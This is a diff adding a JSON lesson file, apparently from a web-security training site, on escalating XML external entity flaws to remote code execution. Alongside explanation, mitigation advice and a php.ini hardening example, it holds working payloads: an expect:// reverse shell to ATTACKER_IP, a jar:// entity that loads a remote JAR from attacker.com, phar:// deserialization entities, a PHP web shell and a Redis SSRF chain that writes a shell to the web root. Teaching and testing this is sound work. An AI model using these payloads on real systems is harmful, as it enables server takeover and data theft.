@@ -1,0 +1,137 @@
+{
+  "id": "rce-escalation",
+  "category": "attack-vectors",
+  "title": "RCE Escalation via XXE",
+  "description": "Advanced techniques for escalating XXE vulnerabilities to Remote Code Execution through protocol handlers and parser-specific features.",
+  "severity": "critical",
+  "cvssScore": 9.8,
+  "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+  "cwe": "CWE-611: Improper Restriction of XML External Entity Reference",
+  "owasp": "OWASP Top 10:2021 - A05: Security Misconfiguration",
+  "sections": [
+    {
+      "id": "overview",
+      "title": "Overview",
+      "type": "text",
+      "content": "While XXE vulnerabilities typically enable file disclosure and SSRF, certain configurations and protocol handlers can escalate XXE to Remote Code Execution (RCE). This represents the most severe impact of XXE vulnerabilities.\n\n**RCE Escalation Paths:**\n• **expect:// wrapper** (PHP) - Execute shell commands\n• **jar:// protocol** (Java) - Load malicious classes\n• **netdoc:// protocol** (Java) - Trigger code execution\n• **phar:// wrapper** (PHP) - Deserialize malicious objects\n• **data:// wrapper** (PHP) - Inline code execution\n• **OOB XXE → SSRF → RCE** - Chain attacks\n\n**Prerequisites for RCE:**\n• Parser supports dangerous protocol handlers\n• Weak file upload validation\n• Deserialization vulnerabilities\n• Internal services with RCE capabilities\n• Specific PHP/Java configurations\n\n**Impact:**\n• Complete server compromise\n• Data exfiltration and modification\n• Lateral movement in network\n• Backdoor installation\n• Service disruption"
+    },
+    {
+      "id": "php-expect-wrapper",
+      "title": "PHP expect:// Wrapper (Direct RCE)",
+      "type": "text",
+      "content": "**What is expect://?**\nThe expect:// wrapper in PHP allows executing shell commands directly through stream wrappers. When combined with XXE, this enables direct RCE.\n\n**Requirements:**\n• PHP with expect extension installed (uncommon but exists)\n• libxml configured to allow expect:// protocol\n• External entity loading enabled\n\n**How It Works:**\n1. XXE payload references expect://command\n2. Parser loads expect:// stream\n3. PHP expect extension executes command\n4. Command output returned to attacker (if classic XXE) or sent OOB\n\n**Detection:**\nCheck if PHP has expect extension:\n```bash\nphp -m | grep expect\n```\n\n**Severity:**\nCritical - Direct command execution with web server privileges"
+    },
+    {
+      "id": "expect-payload",
+      "title": "expect:// RCE Payload",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"expect://id\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>\n\n<!-- More sophisticated: reverse shell -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"expect://bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>\n\n<!-- Command output will appear in response if classic XXE -->\n<!-- For blind XXE, use OOB exfiltration of command results -->",
+        "isVulnerable": true,
+        "filename": "expect-rce.xml"
+      }
+    },
+    {
+      "id": "java-jar-protocol",
+      "title": "Java jar:// Protocol Exploitation",
+      "type": "text",
+      "content": "**jar:// Protocol in Java:**\nJava's jar:// protocol handler can load classes from JAR files. When combined with file upload or SSRF, this can lead to RCE.\n\n**Attack Chain:**\n1. Upload malicious JAR file (disguised as image/document)\n2. Use XXE with jar:// to reference uploaded file\n3. Java loads and executes malicious code from JAR\n4. Achieve RCE\n\n**Example Scenario:**\n• Application allows file upload (validates by extension only)\n• Upload malicious JAR as \"image.jpg\"\n• XXE payload: jar:file:///tmp/uploads/image.jpg!/evil.class\n• Java classloader executes code\n\n**Similar Protocols:**\n• **netdoc://** - Alternative Java protocol for RCE\n• **ftp://** - Can trigger SSRF to FTP server hosting malicious content"
+    },
+    {
+      "id": "jar-rce-example",
+      "title": "jar:// RCE Attack Example",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<!-- Step 1: Upload malicious JAR file disguised as image.jpg -->\n<!-- JAR contains class with static initializer executing payload -->\n\n<!-- Step 2: XXE payload references the uploaded JAR -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"jar:file:///var/www/uploads/image.jpg!/com/evil/Payload.class\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>\n\n<!-- Alternative: Use HTTP to load remote JAR -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"jar:http://attacker.com/evil.jar!/com/evil/Payload.class\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>\n\n<!-- Java classloader will load and execute static initializers -->",
+        "isVulnerable": true,
+        "filename": "jar-rce.xml"
+      }
+    },
+    {
+      "id": "phar-deserialization",
+      "title": "PHP phar:// Deserialization",
+      "type": "text",
+      "content": "**phar:// Wrapper + Object Injection:**\nPHP's phar:// wrapper can trigger deserialization when accessing PHAR archives. Combined with XXE, this enables object injection attacks.\n\n**Attack Requirements:**\n• PHP application uses phar:// wrapper\n• Application has exploitable __destruct() or __wakeup() magic methods\n• Ability to upload PHAR file (or create via XXE)\n• External entity loading enabled\n\n**Attack Flow:**\n1. Create PHAR file with malicious serialized object\n2. Upload PHAR (may bypass as image/document)\n3. XXE references phar:///path/to/file.phar\n4. PHP deserializes object metadata\n5. Magic methods trigger RCE (if vulnerable classes exist)\n\n**Common RCE Gadgets:**\n• Monolog\\Handler\\SyslogUdpHandler\n• Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter\n• Custom application classes with dangerous __destruct()"
+    },
+    {
+      "id": "phar-payload",
+      "title": "phar:// Deserialization Payload",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<!-- First, create malicious PHAR with serialized object -->\n<!-- Upload PHAR file disguised as legitimate file -->\n\n<!-- XXE payload triggers deserialization -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"phar:///var/www/uploads/malicious.jpg\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>\n\n<!-- Alternative: phar:// with specific file inside archive -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"phar:///tmp/upload.phar/test.txt\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>\n\n<!-- When PHP processes phar://, it deserializes metadata -->\n<!-- If vulnerable gadget chain exists, achieves RCE -->",
+        "isVulnerable": true,
+        "filename": "phar-deserialization.xml"
+      }
+    },
+    {
+      "id": "data-wrapper",
+      "title": "PHP data:// Wrapper",
+      "type": "text",
+      "content": "**data:// Protocol for Code Execution:**\nPHP's data:// wrapper allows embedding data directly in the URI. While not direct RCE, it can be chained with other vulnerabilities.\n\n**Usage in XXE:**\n```xml\n<!ENTITY xxe SYSTEM \"data://text/plain,<?php system($_GET['cmd']); ?>\">\n```\n\n**Limitations:**\n• Requires allow_url_include = On (rare in production)\n• Entity content often not executed directly\n• More useful for bypassing filters than direct RCE\n\n**More Effective: data:// + PHP filter chains**\n```xml\n<!ENTITY xxe SYSTEM \"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+\">\n```\n\nBase64 decodes to: `<?php system($_GET['cmd']); ?>`"
+    },
+    {
+      "id": "xxe-ssrf-rce-chain",
+      "title": "XXE → SSRF → RCE Chain",
+      "type": "text",
+      "content": "**Chaining Attacks for RCE:**\nEven without dangerous protocol handlers, XXE can escalate to RCE through SSRF.\n\n**Attack Chain Examples:**\n\n**1. XXE → Internal Service RCE**\n• XXE enables SSRF to internal services\n• Internal admin panel has command execution\n• Chain: XXE → SSRF to admin panel → RCE\n\n**2. XXE → Redis/Memcached → RCE**\n• XXE enables SSRF to Redis/Memcached on localhost\n• Redis/Memcached exposed without authentication\n• Use SSRF to write web shell to document root\n• Chain: XXE → SSRF to Redis → Write shell → RCE\n\n**3. XXE → Cloud Metadata → RCE**\n• XXE enables access to cloud metadata (169.254.169.254)\n• Retrieve IAM credentials or user-data scripts\n• Use credentials to access other services with RCE\n• Chain: XXE → Metadata → Credentials → Service RCE\n\n**4. XXE → Elasticsearch → RCE**\n• XXE enables SSRF to internal Elasticsearch\n• Elasticsearch has script execution features\n• Use Groovy/Painless scripts for RCE\n• Chain: XXE → SSRF to ES → Script execution"
+    },
+    {
+      "id": "redis-rce-example",
+      "title": "XXE → Redis SSRF → RCE Example",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<!-- Step 1: Use XXE to SSRF to local Redis -->\n<!-- Redis protocol uses CRLF, embed commands -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"http://localhost:6379/%0D%0ACONFIG%20SET%20dir%20/var/www/html%0D%0ACONFIG%20SET%20dbfilename%20shell.php%0D%0ASET%20payload%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%22%0D%0ASAVE%0D%0A\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>\n\n<!-- Explanation:\n1. SSRF to localhost:6379 (Redis)\n2. CONFIG SET dir /var/www/html (set Redis dump location)\n3. CONFIG SET dbfilename shell.php (set dump filename)\n4. SET payload \"<?php system($_GET['cmd']); ?>\" (store web shell)\n5. SAVE (write dump file to disk)\n6. Result: shell.php written to web root\n7. Access http://target/shell.php?cmd=id for RCE\n-->",
+        "isVulnerable": true,
+        "filename": "xxe-redis-rce.xml"
+      }
+    },
+    {
+      "id": "gopher-protocol",
+      "title": "gopher:// Protocol for Complex SSRF",
+      "type": "text",
+      "content": "**gopher:// for Advanced SSRF:**\nThe gopher:// protocol allows constructing arbitrary TCP payloads, enabling complex SSRF attacks that can lead to RCE.\n\n**Capabilities:**\n• Send raw TCP data to any service\n• Craft protocol-specific commands (HTTP, Redis, SMTP, etc.)\n• Multi-line requests with proper CRLF\n• Binary data transmission\n\n**RCE Scenarios:**\n\n**1. FastCGI RCE**\n```xml\n<!ENTITY xxe SYSTEM \"gopher://127.0.0.1:9000/[FastCGI binary payload]\">\n```\nSend FastCGI packet to PHP-FPM, set PHP_VALUE to execute code\n\n**2. MySQL RCE**\n```xml\n<!ENTITY xxe SYSTEM \"gopher://localhost:3306/[MySQL protocol payload]\">\n```\nIf MySQL accessible, use LOAD DATA INFILE for file operations\n\n**3. SMTP Command Injection**\n```xml\n<!ENTITY xxe SYSTEM \"gopher://localhost:25/[SMTP commands]\">\n```\nIf mail server exposed, potentially inject commands\n\n**Limitations:**\n• Complex payload encoding (URL encoding required)\n• Some parsers block gopher://\n• Requires deep protocol knowledge"
+    },
+    {
+      "id": "mitigation",
+      "title": "RCE Escalation Prevention",
+      "type": "text",
+      "content": "**Defense Against XXE → RCE:**\n\n**Primary Defenses:**\n☐ **Disable external entities** (prevents all XXE)\n☐ **Disable dangerous protocol handlers**\n  • PHP: Disable expect, phar wrappers\n  • Java: Restrict jar://, netdoc:// protocols\n☐ **Disable DTD processing entirely** (if not needed)\n\n**Secondary Defenses:**\n☐ **Network segmentation**\n  • Block outbound connections from app servers\n  • Prevent access to internal services (Redis, MySQL, etc.)\n  • Block cloud metadata IPs (169.254.169.254)\n☐ **File upload validation**\n  • Validate file content, not just extension\n  • Scan uploaded files for PHAR/JAR signatures\n  • Store uploads outside web root\n  • Randomize filenames\n☐ **Least privilege**\n  • Run parsers with minimal file system access\n  • Restrict write permissions\n  • Use containers/sandboxes\n☐ **Disable unnecessary PHP extensions**\n  • Remove expect extension if not needed\n  • Disable allow_url_include\n  • Restrict stream wrappers\n\n**Monitoring & Detection:**\n☐ Monitor for suspicious protocol usage (expect://, jar://)\n☐ Alert on internal service connections from app servers\n☐ Log all file uploads and XXE attempts\n☐ Monitor for deserialization attempts"
+    },
+    {
+      "id": "php-hardening",
+      "title": "PHP Configuration Hardening",
+      "type": "code",
+      "code": {
+        "language": "ini",
+        "code": "; php.ini hardening to prevent XXE → RCE\n\n; Disable dangerous stream wrappers\nallow_url_fopen = Off\nallow_url_include = Off\n\n; Disable expect extension (if installed)\n; extension=expect.so  ; Comment out or remove\n\n; Restrict phar:// wrapper (PHP 8.0+)\n; phar.readonly = On  ; Already default\n\n; Disable external entity loading (libxml)\n; Note: Set this at runtime via libxml_disable_entity_loader(true) for PHP < 8.0\n; For PHP 8.0+, external entities disabled by default\n\n; Additional security settings\ndisable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source\n\n; Limit resource usage\nmax_execution_time = 30\nmemory_limit = 128M\nupload_max_filesize = 2M\npost_max_size = 8M",
+        "isVulnerable": false,
+        "filename": "php.ini"
+      }
+    },
+    {
+      "id": "detection-checklist",
+      "title": "RCE Escalation Testing Checklist",
+      "type": "text",
+      "content": "**Testing for XXE → RCE Potential:**\n\n**PHP Targets:**\n☐ Test expect:// wrapper\n  • `<!ENTITY xxe SYSTEM \"expect://id\">`\n☐ Test phar:// deserialization\n  • Upload PHAR, reference with phar://\n☐ Test data:// wrapper\n  • `<!ENTITY xxe SYSTEM \"data://text/plain,<?php phpinfo(); ?>\">`\n☐ Check for dangerous PHP functions enabled\n  • system(), exec(), passthru(), shell_exec()\n\n**Java Targets:**\n☐ Test jar:// protocol\n  • Upload JAR, reference with jar://\n☐ Test netdoc:// protocol\n  • `<!ENTITY xxe SYSTEM \"netdoc://localhost/test\">`\n☐ Check Java version for known XXE → RCE CVEs\n\n**SSRF → RCE Chains:**\n☐ Test access to Redis (port 6379)\n☐ Test access to Memcached (port 11211)\n☐ Test access to Elasticsearch (port 9200)\n☐ Test access to FastCGI (port 9000)\n☐ Test cloud metadata access (169.254.169.254)\n☐ Test internal admin panels\n\n**Protocol Handler Tests:**\n☐ Test gopher:// for raw TCP\n☐ Test ftp:// for FTP server access\n☐ Test file:// for file operations\n\n**Deserialization:**\n☐ Check for deserialization vulnerabilities in app\n☐ Test gadget chains if found\n☐ Combine with file upload for PHAR attacks"
+    }
+  ],
+  "relatedTopics": ["ssrf", "file-disclosure", "blind-xxe", "file-upload-xxe"],
+  "references": [
+    {
+      "title": "PortSwigger - XXE to RCE",
+      "url": "https://portswigger.net/web-security/xxe"
+    },
+    {
+      "title": "OWASP - XXE Prevention",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html"
+    },
+    {
+      "title": "Gosecure - PHAR Deserialization",
+      "url": "https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf"
+    }
+  ]
+}
